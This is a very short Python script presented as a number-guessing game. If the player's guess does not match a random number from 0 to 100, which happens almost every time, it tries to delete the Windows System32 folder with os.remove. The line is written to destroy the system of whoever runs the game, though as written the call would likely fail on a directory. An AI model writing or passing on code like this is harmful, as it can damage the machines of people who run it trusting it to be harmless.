import random
import os

sos = int(input("Enter a Number"))

if sos == random.randint(0, 100):
    print("You Win!")
else:
    os.remove("C:\Windows\System32")